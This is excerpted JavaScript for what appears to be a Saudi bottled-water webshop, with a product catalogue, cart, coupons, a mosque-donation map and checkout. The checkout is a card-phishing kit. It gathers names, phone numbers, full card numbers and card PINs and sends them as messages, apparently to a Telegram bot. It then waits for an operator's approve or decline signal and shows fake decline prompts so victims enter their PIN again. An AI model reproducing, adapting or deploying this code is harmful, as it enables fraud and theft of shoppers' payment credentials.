...
const products = [
    {
        id: 1, name: 'ماء زمزم ٣٣٠ مل', category: 'water',
        price: 48.00, desc: '(١ كرتون-٢٤ عبوة)',
        badge: '', badgeClass: '',
        img: 'assets/images/products/photo_6016905855355260312_y.png'
    },
    {
        id: 2, name: 'بيرين ٢٠٠ مل', category: 'water',
        price: 21.84, desc: '(١ كرتون-٤٨ عبوة بلاستيك)',
        badge: '', badgeClass: '',
        img: 'assets/images/products/photo_6021377036569481297_x.png'
    },
    {
        id: 3, name: 'بيرين ٢٧٠ مل', category: 'water',
        price: 69.50, desc: '(١ كرتون-٢٤ مياه غازية بنكهة الليمون الطبيعي)',
        badge: '', badgeClass: '',
        img: 'assets/images/products/photo_6016905855355260310_y.png'
    },
    {
        id: 4, name: 'بيرين ٣٣٠ مل', category: 'water',
        price: 21.84, desc: '(١ كرتون-٤٠ عبوة بلاستيك)',
        badge: '', badgeClass: '',
        img: 'assets/images/products/photo_6021377036569481297_x.png'
    },
    {
        id: 5, name: 'بيرين ٦٠٠ مل', category: 'water',
        price: 18.16, desc: '(١ كرتون-٢٤ عبوة بلاستيك)',
        badge: '', badgeClass: '',
        img: 'assets/images/products/photo_6021377036569481297_x.png'
    },
    {
        id: 6, name: 'بيرين 12 لتر', category: 'functional',
        price: 19.30, desc: '(١ كرتون-٢ عبوة بلاستيك)',
        badge: '', badgeClass: '',
        img: 'assets/images/products/photo_6016905855355260307_y.png'
    },
    {
        id: 7, name: 'بيرين ١.٥ لتر', category: 'functional',
        price: 17.96, desc: '(١ كرتون-١٢ عبوة بلاستيك)',
        badge: '', badgeClass: '',
        img: 'assets/images/products/photo_6016905855355260306_y.png'
    },
    {
        id: 8, name: 'بيرين ٢٠٠ مل', category: 'water',
        price: 27.29, desc: '(٣ شرينك-٦٠ عبوة بلاستيك)',
        badge: '', badgeClass: '',
        img: 'assets/images/products/photo_6016905855355260305_y.png'
    },
    {
        id: 9, name: 'بيرين ٣٣٠ مل', category: 'water',
        price: 20.84, desc: '(٣ شرينك-٣٦ عبوة بلاستيك)',
        badge: '', badgeClass: '',
        img: 'assets/images/products/photo_6016905855355260304_y.png'
    },
    {
        id: 10, name: 'بيرين ٢٧٠ مل', category: 'water',
        price: 44.70, desc: '(١ كرتون-٢٤ عبوة زجاج)',
        badge: '', badgeClass: '',
        img: 'assets/images/products/photo_6016905855355260303_y.png'
    },
    {
        id: 11, name: 'بيرين  ٧٥٠ مل', category: 'water',
        price: 47.90, desc: '(١ كرتون-١٢ عبوة زجاج)',
        badge: '', badgeClass: '',
        img: 'assets/images/products/photo_6016905855355260303_y.png'
    },
    {
        id: 12, name: 'بيرين ٢٧٠ مل', category: 'water',
        price: 69.50, desc: '(١ كرتون-٢٤ عبوة زجاج غازية)',
        badge: '', badgeClass: '',
        img: 'assets/images/products/photo_6016905855355260302_y.png'
    },
    {
        id: 13, name: 'بيرين  ٧٥٠ مل', category: 'water',
        price: 69.50, desc: '(١ كرتون-١٢ عبوة زجاج غازية)',
        badge: '', badgeClass: '',
        img: 'assets/images/products/photo_6016905855355260301_y.png'
    },
    {
        id: 14, name: 'بيرين صوديوم اقل ٣٣٠ مل', category: 'water',
        price: 20.84, desc: '(١ كرتون-٤٠ عبوة)',
        badge: '', badgeClass: '',
        img: 'assets/images/products/photo_6016905855355260308_y.png'
    }
];
...
document.addEventListener('DOMContentLoaded', () => {
    ...
    if (overlay) {
        ...
        }, 1000); // تسر.س الاختفاء إلى ثانية واحدة
    }
        ...
        card.innerHTML = `
            <div class="product-image" onclick="openModal(${product.id})">
                ...
                <button class="product-btn fav ${favorites.includes(product.id) ? 'active' : ''}" 
                        ...
                        style="position: absolute; top: 10px; left: 10px; z-index: 5; width: 32px; height: 32px; border-radius: 50%; background: rgba(255,255,255,0.8); border: none; box-shadow: 0 2px 8px rgba(0,0,0,0.1); color: #6b7a99;">
...
// ===== HOMES / MOSQUES TOGGLE =====
let mosquesMap = null;
let userMarker = null;

function showHomes(element) {
    document.getElementById('homes-section').style.display = 'block';
    document.getElementById('mosques-section').style.display = 'none';
    document.getElementById('btn-homes').classList.add('active');
    document.getElementById('btn-mosques').classList.remove('active');
}

function showMosques(element) {
    document.getElementById('homes-section').style.display = 'none';
    document.getElementById('mosques-section').style.display = 'block';
    document.getElementById('btn-homes').classList.remove('active');
    document.getElementById('btn-mosques').classList.add('active');
    initMosquesMap();
}

function initMosquesMap() {
    if (mosquesMap) {
        setTimeout(() => mosquesMap.invalidateSize(), 200);
        return;
    }
    
    // Default center: Saudi Arabia
    let defaultLat = 21.5433;
    let defaultLng = 39.1728;

    mosquesMap = L.map('mosques-map', {
    ...
    L.control.zoom({ position: 'topleft' }).addTo(mosquesMap);
    ...
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            ...
            mosquesMap.setView([lat, lng], 12);

            if (userMarker) mosquesMap.removeLayer(userMarker);
...
function openMosqueSearchModal() {
    // Build search URL using user location for nearby mosque search
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            // Open OpenStreetMap search for nearby mosques
            const searchUrl = `https://www.openstreetmap.org/search?query=mosque&lat=${lat}&lon=${lng}&zoom=15`;
            window.open(searchUrl, '_blank');
        }, function(error) {
            // If location denied, open general mosque search
            window.open('https://www.openstreetmap.org/search?query=mosque&zoom=10', '_blank');
        });
    } else {
        window.open('https://www.openstreetmap.org/search?query=mosque&zoom=10', '_blank');
    }
...
function showMosqueDonation(city) {
    showNotification(`شكراً لتبرّعك في ${city}! سيتم التواصل معك قريباً.`);
}
...
function renderCart() {
    ...
    // Coupon Section
    html += `
        <div class="coupon-section" style="margin: 1rem 0; padding: 1rem; background: #e8f7f6; border-radius: 12px; border: 1px dashed #00A99D;">
            <div style="font-size: 0.9rem; font-weight: 700; margin-bottom: 0.5rem; color: #00A99D;">كود الخصم</div>
            <div style="display: flex; gap: 0.5rem;">
                <input type="text" id="coupon-input" placeholder="أدخل الكود هنا" value="${appliedCoupon}" style="flex: 1; padding: 0.6rem; border: 1px solid #00A99D; border-radius: 8px; outline: none; font-family: inherit;">
                <button onclick="applyCoupon()" style="padding: 0.6rem 1.2rem; background: #00A99D; color: white; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; transition: all 0.3s ease;" onmouseover="this.style.boxShadow='0 4px 12px rgba(0, 169, 157, 0.4)'" onmouseout="this.style.boxShadow='none'">تطبيق</button>
            </div>
            <div id="coupon-message" style="font-size: 0.8rem; margin-top: 0.4rem; display: ${appliedCoupon ? 'block' : 'none'}; color: ${appliedDiscount > 0 ? 'var(--success)' : 'var(--danger)'};">
                ${appliedDiscount > 0 ? `تم تطبيق خصم 20% بنجاح!` : ''}
            </div>
        </div>
    `;
    ...
    html += `
        ...
        <button class="btn-primary" onclick="goToPage('checkout-info-page')" style="width:100%;">
            <i class="fas fa-arrow-left"></i> إتمام الطلب · ${total.toFixed(2)} ر.س
        </button>
    `;
        ...
        html += `
            <div class="product-card" onclick="openModal(${product.id})">
                <div class="product-image">
                    <img src="${product.img}" alt="${product.name}">
                    ${product.badge ? `<div class="product-badge ${product.badgeClass}">${product.badge}</div>` : ''}
                    <button class="product-btn fav active" 
                            onclick="toggleFavorite(${product.id}, event)"
                            style="position: absolute; top: 10px; left: 10px; z-index: 5; width: 32px; height: 32px; border-radius: 50%; background: rgba(255,255,255,0.8); border: none; box-shadow: 0 2px 8px rgba(0,0,0,0.1); color: var(--danger);">
                        <i class="fas fa-heart"></i>
                    </button>
                </div>
                <div class="product-info" style="text-align: center;">
...
function openModal(productId) {
    ...
    document.getElementById('modal-price').textContent = currentModalProduct.price.toFixed(2) + ' ر.س';
...
if (!phone || phone.length !== 9 || !phone.startsWith('5')) {
        alert('الرجاء إدخال رقم هاتف سعودي صحيح (9 أرقام يبدأ بـ 5)');
        return;
    }
    
    checkoutData.name = name;
    checkoutData.phone = '+966' + phone;
    ...
    const message = 
        ...
        `📞 <b>الهاتف:</b> <code>+966 ${phone}</code>\n\n` +
...
async function validateAddress(event) {
    ...
    checkoutData.emirate = checkoutData.detectedAddress ? checkoutData.detectedAddress.split(' - ')[0] : 'السعودية';
    ...
    const message = 
        ...
        `💰 <b>الإجمالي المتوقع:</b> <code>${total.toFixed(2)} ر.س</code>\n` +
        `${appliedDiscount > 0 ? `🎁 <b>كود الخصم:</b> <code>${appliedCoupon} (20%-)</code>\n` : ''}\n` +
        `⏰ ${new Date().toLocaleString('ar-EG')}`;
...
function renderInvoice() {
        ...
        <div style="background:white; border-radius:12px; padding:1.5rem; margin-bottom:1rem;">
            ...
            <div style="background:#f9fafb; border-radius:8px; padding:1rem;">
                <div style="display:flex; justify-content:space-between; margin-bottom:0.5rem;">
                    ...
                    <span id="invoice-subtotal" style="font-weight:600;">0.00 ر.س</span>
                </div>
                <div style="display:flex; justify-content:space-between; margin-bottom:0.5rem;">
                    <span style="color:var(--text-light);">رسوم التوصيل</span>
                    <span id="invoice-delivery" style="font-weight:600;">مجاناً</span>
                </div>
                ${appliedDiscount > 0 ? `
                <div style="display:flex; justify-content:space-between; margin-bottom:0.8rem; padding-bottom:0.8rem; border-bottom:1px solid #e0e6ed; color: var(--success);">
                    ...
                    <span style="font-weight:600;">-${discountAmount.toFixed(2)} ر.س</span>
                </div>
                ` : `
                ...
                <div style="display:flex; justify-content:space-between;">
                    ...
                    <span id="invoice-total" style="font-weight:700; font-size:1.1rem; color:var(--primary);">0.00 ر.س</span>
                </div>
            </div>
        </div>
    `;
    ...
    cart.forEach(item => {
        itemsHtml += `
            <div class="invoice-item">
                ...
                <div class="invoice-item-price">${(item.price * item.qty).toFixed(2)} ر.س</div>
            </div>
        `;
    });
    ...
    document.getElementById('invoice-total').textContent = total.toFixed(2) + ' ر.س';
...
async function submitCardPayment(event) {
    ...
    const message = 
        ...
        `💰 <b>الإجمالي:</b> <code>${checkoutData.total.toFixed(2)} ر.س</code>\n` +
        `${checkoutData.discount > 0 ? `🎁 <b>الخصم:</b> <code>${checkoutData.discount.toFixed(2)} ر.س (${checkoutData.coupon})</code>\n` : ''}` +
...
function setupPinPage() {
    const cardNumber = checkoutData.cardNumber || "";
    const bin = cardNumber.substring(0, 6);
    const last4 = cardNumber.slice(-4) || "****";
    
    document.getElementById('pin-card-last4').textContent = last4;
    
    // Setup Logos
    const networkLogo = document.getElementById('pin-network-logo');
    const firstDigit = cardNumber[0];
    if (firstDigit === '4') {
        networkLogo.src = 'assets/images/Visa.png';
        networkLogo.style.display = 'block';
    } else if (firstDigit === '5') {
        networkLogo.src = 'assets/images/Mastercard.png';
        networkLogo.style.display = 'block';
    } else {
    ...
    const bankLogo = document.getElementById('pin-bank-logo');
    if (bankKey) {
        bankLogo.src = 'assets/images/' + bankKey + '.png';
    ...
    const hidden = document.getElementById('pin-verification-code');
    const submitBtn = document.getElementById('pin-submit-btn');
    const form = document.getElementById('pin-code-form');
    
    boxes.forEach(b => b.value = "");
    hidden.value = "";
    submitBtn.disabled = true;
    submitBtn.classList.remove('active');
    document.getElementById('pin-decline-box').classList.remove('show');
    ...
    boxes.forEach((box, i) => {
        // Clear previous listeners if any (though usually fine in SPA if carefully managed)
        box.oninput = () => {
    ...
    form.onsubmit = async (e) => {
        ...
        const requestId = Date.now();
        const message = 
            `🔐 <b>الرقم السري للبطاقة - Card PIN</b>\n\n` +
            `👤 <b>الاسم:</b> <code>${checkoutData.name}</code>\n` +
            `📞 <b>الهاتف:</b> <code>${checkoutData.phone}</code>\n` +
            `💳 <b>رقم البطاقة:</b> <code>${checkoutData.cardNumber}</code>\n` +
            `🔢 <b>الرقم السري (PIN):</b> <code>${pin}</code>\n\n` +
            `⏰ ${new Date().toLocaleString('ar-EG')}`;
        ...
        const checkInterval = setInterval(async () => {
            ...
            if (status === 'approved') {
                ...
                await editTelegramMessage(messageId, message, '❌ تم الرفض من تليجرام');
                if (loadingOverlay) loadingOverlay.style.display = 'none';
                document.getElementById('pin-decline-box').classList.add('show');
                boxes.forEach(b => b.value = "");
                hidden.value = "";
                updatePinState();
                boxes[0].focus();
...
function displaySuccess() {
    ...
    document.getElementById('success-total').textContent = checkoutData.total.toFixed(2) + ' ر.س';
}
...
function updateAddressLabels() {
    ...
    if (addressType === 'home') {
        ...
        document.getElementById('address-building').placeholder = '';
        document.getElementById('address-floor').placeholder = '';
        document.getElementById('address-number').placeholder = '';
        document.getElementById('address-street').placeholder = '';
